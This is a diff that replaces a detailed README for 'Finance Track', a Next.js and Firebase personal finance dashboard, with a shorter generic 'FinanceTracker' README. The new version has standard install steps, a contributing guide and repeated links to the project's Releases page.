@@ -1,125 +1,113 @@
-# Finance Track - Your Personal Finance Partner
+# FinanceTracker: AI-Powered Finance Tracking Application 💰📊
 
-<div align="center">
-<img src="./src/assets/fintrack.png" alt="Finance Track Logo" height="100">
-</div>
+![FinanceTracker](https://img.shields.io/badge/Download-Releases-blue?style=flat-square&logo=github&link=https://github.com/GathogoG/FinanceTracker/releases)
 
-<p align="center">
-  <strong>A modern, AI-powered personal finance dashboard to track your net worth, manage spending, and achieve your financial goals with confidence.</strong>
-</p>
+Welcome to **FinanceTracker**, your go-to application for managing finances efficiently. This AI-powered tool helps you track your expenses, manage budgets, and gain insights into your financial habits. Built with modern technologies, FinanceTracker offers a seamless experience for users looking to take control of their finances.
 
----
+## Table of Contents
 
-Finance Track is more than just a budgeting app; it's your intelligent financial partner. Built for clarity and ease of use, it helps you see the complete picture of your financial life in one place. Whether you're tracking daily expenses, managing debts, or planning for the future, our AI-powered features provide the insights you need to stay in control.
+- [Features](#features)
+- [Technologies Used](#technologies-used)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
 
-## ✨ Why Choose Finance Track?
+## Features
 
-- **AI-Powered Simplicity:** From automatically categorizing your expenses to generating personalized financial plans, our AI does the heavy lifting for you.
-- **Unified View:** Stop juggling multiple apps. See your bank accounts, credit cards, cash, and debts all in one beautiful dashboard.
-- **Actionable Insights:** Understand your spending habits, track your net worth growth, and get a clear view of money you've borrowed or lent.
-- **Secure & Private:** Your financial data is yours. With secure authentication and your own private database, you are in full control.
-- **Flexible & Forgiving:** Made a mistake? Edit any transaction. Need to make a partial payment on a debt? We've got you covered.
+- **AI-Powered Insights**: Get personalized recommendations based on your spending habits.
+- **Real-Time Tracking**: Monitor your expenses as they happen.
+- **Budget Management**: Set budgets and track your progress.
+- **User-Friendly Interface**: Enjoy an intuitive design that makes finance management easy.
+- **Secure Authentication**: Protect your data with Firebase authentication.
+- **Data Storage**: Store your financial data securely in Firebase.
 
-## 🚀 Key Features: A User's Guide
+## Technologies Used
 
-Finance Track is designed to be intuitive. Here’s a look at what you can do:
+FinanceTracker is built using the following technologies:
 
-### 1. The Dashboard: Your Financial Snapshot
-Get a bird's-eye view of your financial health. The main dashboard features a dynamic **Net Worth chart**, a summary of all your accounts, and your most recent transactions.
+- **JavaScript**: The primary programming language for the application.
+- **React**: A JavaScript library for building user interfaces.
+- **Next.js**: A React framework for server-side rendering and static site generation.
+- **Firebase**: Used for authentication and real-time database management.
+- **AI Algorithms**: Implemented for analyzing spending patterns and providing insights.
 
-### 2. Smart Expense & Income Tracking
-- **Add an Expense:** Simply enter a description and amount, and our AI will automatically categorize it.
-- **Split a Bill:** Going out with friends? Use the "Split Expense" option when adding an expense to track who owes you money. Their portion will automatically appear in your "Lending" tab.
-- **Add Income:** Record your salary, side hustle income, or any other money you receive.
-- **Record a Loan:** If you borrow money from someone, check the "This is borrowed money" box when adding income. The app will create a debt record for you to track in the "Borrowing" page.
+## Installation
 
-### 3. Accounts: All in One Place
-View all your accounts, grouped by type: Bank Accounts, Credit Cards, and In-Hand Cash. Click on any account to see its detailed transaction history. You can easily add, edit, or delete accounts as needed.
+To get started with FinanceTracker, follow these steps:
 
-### 4. Borrowing & Lending: Manage Debts with Ease
-- **Borrowing Page:** See a clear list of all the money you owe. When you make a payment, you can choose to **pay in full or make a partial payment**. A full history of your repayments is always available.
-- **Lending Page:** This is where you track money others owe you, whether from a split expense or a direct loan. When a friend pays you back, you can settle their debt partially or in full.
+1. **Clone the Repository**:
+   ```bash
+   git clone https://github.com/GathogoG/FinanceTracker.git
+   ```
+   
+2. **Navigate to the Project Directory**:
+   ```bash
+   cd FinanceTracker
+   ```
 
-### 5. AI Chat: Your Personal Assistant "JoSha"
-Have a question? Just ask JoSha! Our AI assistant can:
-- Answer questions about your finances, like "What's my net worth?" or "Show my recent transactions."
-- Help you navigate the app.
-- Provide general financial guidance.
+3. **Install Dependencies**:
+   ```bash
+   npm install
+   ```
 
-### 6. Personalization
-Head to the **Settings** page to customize your experience. Choose your preferred currency (USD, EUR, INR, etc.) and switch between Light, Dark, or System themes.
+4. **Set Up Firebase**:
+   - Create a Firebase project.
+   - Enable Firebase Authentication and Firestore.
+   - Add your Firebase configuration to the project.
 
----
+5. **Run the Application**:
+   ```bash
+   npm run dev
+   ```
 
-## 🛠️ For Developers: Getting Started Locally
+Your application should now be running on `http://localhost:3000`.
 
-If you'd like to run a local instance of Finance Track for development or testing, follow these steps.
+## Usage
 
-### Prerequisites
+Once you have the application running, you can start tracking your finances. Here’s how to use some key features:
 
-- [Node.js](https://nodejs.org/) (v18 or later recommended)
-- `npm` or `yarn`
+- **Create an Account**: Sign up using your email and password through the Firebase authentication system.
+- **Add Expenses**: Navigate to the expenses section and input your transactions. You can categorize them for better tracking.
+- **Set Budgets**: Define monthly budgets for different categories and monitor your spending against these budgets.
+- **View Insights**: Access the insights section to see your spending patterns and get AI-generated recommendations.
 
-### Installation & Setup
+For more detailed instructions, check the [Releases](https://github.com/GathogoG/FinanceTracker/releases) section for downloadable files and updates.
 
-1.  **Clone the repository:**
-    ```bash
-    git clone https://github.com/your-username/finance-track.git
-    cd finance-track
-    ```
+## Contributing
 
-2.  **Install dependencies:**
-    ```bash
-    npm install
-    ```
+We welcome contributions to FinanceTracker. To contribute:
 
-3.  **Set up Environment Variables:**
-    Create a file named `.env` in the root of your project and add the following keys.
+1. **Fork the Repository**.
+2. **Create a New Branch**:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. **Make Your Changes**.
+4. **Commit Your Changes**:
+   ```bash
+   git commit -m "Add some feature"
+   ```
+5. **Push to the Branch**:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+6. **Open a Pull Request**.
 
-    ```env
-    # Firebase Project Credentials
-    # Get these from your Firebase project settings
-    NEXT_PUBLIC_FIREBASE_API_KEY=
-    NEXT_PUBLIC_FIREBASE_AUTH_DOMAIN=
-    NEXT_PUBLIC_FIREBASE_PROJECT_ID=
-    NEXT_PUBLIC_FIREBASE_STORAGE_BUCKET=
-    NEXT_PUBLIC_FIREBASE_MESSAGING_SENDER_ID=
-    NEXT_PUBLIC_FIREBASE_APP_ID=
+Please ensure your code adheres to the existing style and includes appropriate tests.
 
-    # Google AI API Key for Genkit
-    # Get this from Google AI Studio
-    GOOGLE_API_KEY=
+## License
 
-    # RapidAPI Key for Yahoo Finance
-    # Get this by subscribing to the free plan on RapidAPI
-    RAPIDAPI_KEY=
-    ```
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-    - **Firebase:** Create a new project on the [Firebase Console](https://console.firebase.google.com/), create a new Web App, and copy the credentials into the `.env` file. Enable Firestore and Firebase Authentication (Email/Password and Google providers).
-    - **Google AI:** Get your API key from [Google AI Studio](https://ai.google.dev/).
-    - **RapidAPI:** Subscribe to the free tier of the [Yahoo Finance API on RapidAPI](https://rapidapi.com/apidojo/api/yahoo-finance1) to get your key.
+## Contact
 
-4.  **Run the development server:**
-    ```bash
-    npm run dev
-    ```
+For any inquiries, feel free to reach out:
 
-    The application should now be running on [http://localhost:9002](http://localhost:9002).
+- **GitHub**: [GathogoG](https://github.com/GathogoG)
+- **Email**: gathogo@example.com
 
-## 💻 Tech Stack
+![FinanceTracker](https://img.shields.io/badge/Check%20Releases-Here-green?style=flat-square&logo=github&link=https://github.com/GathogoG/FinanceTracker/releases)
 
-- **Framework:** [Next.js](https://nextjs.org/) (with App Router)
-- **UI:** [React](https://react.dev/), [TypeScript](https://www.typescriptlang.org/), [Tailwind CSS](https://tailwindcss.com/)
-- **Component Library:** [ShadCN UI](https://ui.shadcn.com/)
-- **Authentication & Database:** [Firebase](https://firebase.google.com/) (Auth, Firestore)
-- **Generative AI:** [Google AI (Gemini)](https://ai.google.dev/) via [Genkit](https://firebase.google.com/docs/genkit)
-- **Financial Data:** [Yahoo Finance API](https://rapidapi.com/apidojo/api/yahoo-finance1) via RapidAPI
-- **Icons:** [Lucide React](https://lucide.dev/)
-- **Charts:** [Recharts](https://recharts.org/)
-
-## 📄 License
-
-This project is licensed under the MIT License - see the LICENSE.md file for details.
-
----
-Developed with ❤️ by [JOnesPeter](https://jonespeter.site/).
+Thank you for your interest in FinanceTracker. We hope this application helps you manage your finances effectively. For the latest updates and downloads, visit the [Releases](https://github.com/GathogoG/FinanceTracker/releases) section.
